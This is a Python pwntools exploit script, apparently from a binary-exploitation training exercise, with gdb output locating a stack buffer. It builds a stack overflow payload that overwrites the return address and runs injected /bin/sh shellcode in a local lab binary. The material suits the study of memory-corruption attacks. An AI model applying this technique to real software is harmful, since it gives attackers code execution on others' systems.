#!/usr/bin/python

"""
(gdb) bt
#0  0xf7fd5059 in __kernel_vsyscall ()
#1  0xf7eb7cd7 in read () from /lib/i386-linux-gnu/libc.so.6
#2  0x08048526 in vulnerable () at src/04-shellcode-static.c:10
#3  0x08048552 in main (argc=1, argv=0xffffd0a4) at src/04-shellcode-static.c:17
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x080484e6 <+0>:	push   ebp
...
   0x0804853b <+85>:	ret    
End of assembler dump.
(gdb) b *0x0804853b
Breakpoint 1 at 0x804853b: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, 0x0804853b in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p &buffer[0]
$1 = 0xffffcf60 'a' <repeats 128 times>, "\001"
(gdb) i r $sp
sp             0xffffcfec	0xffffcfec
(gdb) info proc mappings
process 28174
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
...
	0xf7dd1000 0xf7fa6000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa6000 0xf7fa7000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa7000 0xf7fa9000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa9000 0xf7faa000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
...
"""

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/04-shellcode-static'
libc_path = '/lib/i386-linux-gnu/libc-2.27.so'

vulnerable_ret_addr = 0xffffcfec
buffer_addr = 0xffffcf60
libc_addr = 0xf7dd1000

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#g = gdb.attach(p, 'file ./bin/x86/04-shellcode-static')

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p32(vulnerable_ret_addr + 4)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
